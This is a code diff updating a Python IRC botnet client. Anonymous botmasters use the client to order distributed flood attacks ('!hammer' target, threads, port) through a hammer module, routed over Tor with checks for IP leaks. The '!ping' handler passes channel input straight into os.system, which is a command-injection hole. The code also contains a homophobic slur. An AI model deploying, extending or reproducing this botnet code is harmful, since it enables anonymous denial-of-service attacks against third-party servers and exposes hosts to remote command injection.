@@ -102,6 +102,26 @@ previous = get_previous()
 config = {}
 execfile("configuration.conf", config)
 
+# Configuration variables
+
+ircd = config["ircd"]
+ircport = config["ircport"]
+
+botmaster = config["botmaster"]
+masterbot = config["masterbot"]
+admins = config["admins"]
+
+minthreads = config["minthreads"]
+maxthreads = config["maxthreads"]
+
+tor = config["tor"]
+torattack = config["torattack"]
+
+ping = config["ping"]
+
+channel = config["channel"]
+password = ""
+
 # Language
 
 language = config["language"]
@@ -114,7 +134,7 @@ except Exception as e:
 
 # Version
 
-version = "0.2.2"
+version = "0.2.3"
 
 # Argparse
 
@@ -122,7 +142,7 @@ parser = argparse.ArgumentParser()
 parser.add_argument("--port", "-p",
                     help="SOCKS5 port")
 parser.add_argument("--version", "-v",
-                    help="Script version",
+                    help="Display version",
                     action="store_true")
 args = parser.parse_args()
 
@@ -134,7 +154,16 @@ if args.version:
 
 class hammer(threading.Thread):
     def run(self):
-        claudiashammer.main(target, int(threads), int(port), False)
+        if (tor == True) and (torattack == True):
+            claudiashammer.main(target, int(threads), int(port), False)
+        elif (tor == True) and (torattack == False):
+            fail("Unlucky, you will attack using Tor. (the entire script runs within Tor and I'm lazy to add this feature which is totally useless)")
+            time.sleep(1)
+            claudiashammer.main(target, int(threads), int(port), False)
+        elif (tor == False) and (torattack == True):
+            claudiashammer.main(target, int(threads), int(port), True)
+        elif (tor == False) and (torattack == False):
+            claudiashammer.main(target, int(threads), int(port), False)
 
 okblue(art)
 time.sleep(1)
@@ -179,8 +208,21 @@ if platform.system() != "Windows":
         okgreen("Root!")
 
 # Tor
-socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", socksport, True)
-socket.socket = socks.socksocket
+
+if (tor == True) and (torattack == True):
+    okgreen("You're using the default Tor configuration.")
+    time.sleep(1)
+
+elif (tor == False) and (torattack == False):
+    fail("You're not using Tor at all.")
+    time.sleep(1)
+
+if tor == True:
+	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", socksport, True)
+	socket.socket = socks.socksocket
+else:
+    warning("You're joining the IRC without Tor.")
+    time.sleep(1)
 s = socks.socksocket()
 
 if platform.system() == "Windows":
@@ -191,12 +233,12 @@ else:
 if IP == native_ip:
     IP = 0
     fail(lang["yoipleaks"])
-    time.sleep(2)
+    sys.exit()
 else:
     okgreen(lang["noipleaks"])
     time.sleep(1)
 
-okblue("IP: " + IP)
+okblue("IP: " + str(IP))
 
 # Setting nicknames and realnames
 
@@ -206,23 +248,9 @@ if nickname ==  "":
 else:
     nickname = nickname + str(int(random.random() * 1000))
 print(lang["bettrname"] + bcolors.FAIL + nickname + bcolors.ENDC + lang["setinfile"])
+
 username = nickname
 realname = nickname
-ircd = config["ircd"]
-ircport = config["ircport"]
-
-botmaster = config["botmaster"]
-masterbot = config["masterbot"]
-admins = config["admins"]
-
-minthreads = config["minthreads"]
-maxthreads = config["maxthreads"]
-
-ping = config["ping"]
-
-channel = config["channel"]
-
-password = ""
 
 try:
     s.connect((ircd, ircport))
@@ -262,7 +290,7 @@ def message(msg):
 # Private-Messaging
 def privmessage(user2, msg):
     s.send(":source PRIVMSG " + user2 + " :" + msg + "\r\n")
-    print(bcolors.OKGREEN + nickname+" ("+lang["senderyou"]+") --> " + user2 + ": " + bcolors.ENDC + msg)
+    #print(bcolors.OKGREEN + nickname+" ("+lang["senderyou"]+") --> " + user2 + ": " + bcolors.ENDC + msg)
 
     
 # Wait for ping from server
@@ -315,7 +343,7 @@ while 1:
     senderuser = senderuser[0].split("!")
     senderuser = senderuser[0].strip(":")
     
-
+    destination = string.split(recvd)[2:][0]
 
     #print "recvd: " + recvd
     #print "<%r> %r" % (senderuser, sentmessage)
@@ -328,99 +356,101 @@ while 1:
         pong = "PONG : " + recvd
         s.send(pong)       
         
-        #check for commands only authorized people can give
-    
-    if (senderuser == botmaster) or (senderuser == masterbot) or (senderuser in admins):
-        auth = senderuser
-        allowed = 1
-    elif free_for_all == 1:
-        allowed = 1
-    else:
-        allowed = 0
-            
-     
-    # execute any commands detected from authorised people
-    
-    if allowed == 1:
-        if sentmessage == "!test":
-            time.sleep(1)
-            message("Testing: v" + version)
-            s.send("PRIVMSG " + senderuser + " :" + getip() + " @" + version + "\r\n")
-        if "!hammer" in sentmessage:
-            if target is None:
-                attackdata = sentmessage.replace("!hammer ", "")
+    #check for commands only authorized people can give
+
+    if destination == channel:
+        
+        if (senderuser == botmaster) or (senderuser == masterbot) or (senderuser in admins):
+            auth = senderuser
+            allowed = 1
+        elif free_for_all == 1:
+            allowed = 1
+        else:
+            allowed = 0
+                
+         
+        # execute any commands detected from authorised people
+        
+        if allowed == 1:
+            if sentmessage == "!test":
+                time.sleep(1)
+                message("Testing: v" + version)
+                s.send("PRIVMSG " + senderuser + " :" + getip() + " @" + version + "\r\n")
+            if "!hammer" in sentmessage:
+                if target is None:
+                    attackdata = sentmessage.replace("!hammer ", "")
+                    try:
+                        attackspecs = re.findall(r'(.*?) (.*?) (.*)', attackdata)
+                        target, threads, port = attackspecs[0]
+                        time.sleep(2)
+                        threads = int(threads)
+                        if threads < maxthreads:
+                            if threads < minthreads:
+                                threads = minthreads
+                                message("Going with minimum threads (" + str(threads) + ")")
+                        else:
+                            threads = maxthreads
+                            message("Going with maximum threads (" + str(threads) + ")")
+                        port = int(port)
+                        attack_hammer = hammer()
+                        hammer.start(attack_hammer)
+                    except Exception as e:
+                        fail(lang["incorrect"] + "!hammer" + lang["incformat"])
+                        message("Incorrect !hammer format.")
+                        print(e)
+            if "!command" in sentmessage:
                 try:
-                    attackspecs = re.findall(r'(.*?) (.*?) (.*)', attackdata)
-                    target, threads, port = attackspecs[0]
-                    time.sleep(2)
-                    threads = int(threads)
-                    if threads < maxthreads:
-                        if threads < minthreads:
-                            threads = minthreads
-                            message("Going with minimum threads (" + str(threads) + ")")
-                    else:
-                        threads = maxthreads
-                        message("Going with maximum threads (" + str(threads) + ")")
-                    port = int(port)
-                    attack_hammer = hammer()
-                    hammer.start(attack_hammer)
+                    commanddata = sentmessage.replace("!command ", "")
+                    result = re.findall(r'(.*?) (.*)', commanddata)
+                    if result[0][0] == nickname or result[0][0] == "*":
+                        s.send(result[0][1] + "\r\n")
                 except Exception as e:
-                    fail(lang["incorrect"] + "!hammer" + lang["incformat"])
-                    message("Incorrect !hammer format.")
+                    fail(lang["incorrect"] + "!command" + lang["incformat"])
+                    message("Incorrect !command format.")
                     print(e)
-        if "!command" in sentmessage:
-            try:
-                commanddata = sentmessage.replace("!command ", "")
-                result = re.findall(r'(.*?) (.*)', commanddata)
-                if result[0][0] == nickname or result[0][0] == "*":
-                    s.send(result[0][1] + "\r\n")
-            except Exception as e:
-                fail(lang["incorrect"] + "!command" + lang["incformat"])
-                message("Incorrect !command format.")
-                print(e)
-        if "!ping" in sentmessage:
-            if ping == True:
-                pingdata = sentmessage.replace("!ping ", "")
-                try:
-                    response = os.system("ping -c 1 " + pingdata)
-                    if response == 0:
-                        message(pingdata + " is up for me.")
-                    else:
-                        message(pingdata + " is down for me.")
-                except Exception as e:
-                    fail(lang["incorrect"] + "!ping" + lang["incformat"])
-                    message("Incorrect !ping format.")
-                    print(e)
-        if sentmessage == "!stop":
-            get_previous()
-            claudiashammer.stop_now = True
-            message("Stopping the attack")
-            target = None
-            threads = None
-            port = None
-        if ("ACTION pets "+nickname in sentmessage) or ("ACTION pets *" in sentmessage):
-            message("purr")
-        if sentmessage == "!reload":
-            if platform.system() == "Windows":
-                message("I'm a Microfag!")
-            else:
-                if (socksport == 9050):
-                    if getpass.getuser() != "root":
-                        message("Not root")
-                    else:
-                        os.system("service tor reload")
-                        message("Reloading ...")
+            if "!ping" in sentmessage:
+                if ping == True:
+                    pingdata = sentmessage.replace("!ping ", "")
+                    try:
+                        response = os.system("ping -c 1 " + pingdata)
+                        if response == 0:
+                            message(pingdata + " is up for me.")
+                        else:
+                            message(pingdata + " is down for me.")
+                    except Exception as e:
+                        fail(lang["incorrect"] + "!ping" + lang["incformat"])
+                        message("Incorrect !ping format.")
+                        print(e)
+            if sentmessage == "!stop":
+                get_previous()
+                claudiashammer.stop_now = True
+                message("Stopping the attack")
+                target = None
+                threads = None
+                port = None
+            if ("ACTION pets "+nickname in sentmessage) or ("ACTION pets *" in sentmessage):
+                message("purr")
+            if sentmessage == "!reload":
+                if platform.system() == "Windows":
+                    message("I'm a Microfag!")
                 else:
-                    message("Not running :9050")
-        if sentmessage == "Ahoy!":
-            message("Ohai " + auth + "!")
-        if sentmessage == "Ahoy " + nickname + "!":
-            message("Ohai " + auth + "!")
-        if sentmessage == "!version":
-            message(version)
-        if sentmessage == "!stats":
-            if previous["threads"] is not None:
-                message("s:" + previous["threads"])
-        if sentmessage == "!allstats":
-            if previous["threads"] is not None:
-                message("as:" + previous["target"] + ":" + previous["threads"] + ":" + previous["port"])
+                    if (socksport == 9050):
+                        if getpass.getuser() != "root":
+                            message("Not root")
+                        else:
+                            os.system("service tor reload")
+                            message("Reloading ...")
+                    else:
+                        message("Not running :9050")
+            if sentmessage == "Ahoy!":
+                message("Ohai " + auth + "!")
+            if sentmessage == "Ahoy " + nickname + "!":
+                message("Ohai " + auth + "!")
+            if sentmessage == "!version":
+                message(version)
+            if sentmessage == "!stats":
+                if previous["threads"] is not None:
+                    message("s:" + previous["threads"])
+            if sentmessage == "!allstats":
+                if previous["threads"] is not None:
+                    message("as:" + previous["target"] + ":" + previous["threads"] + ":" + previous["port"])
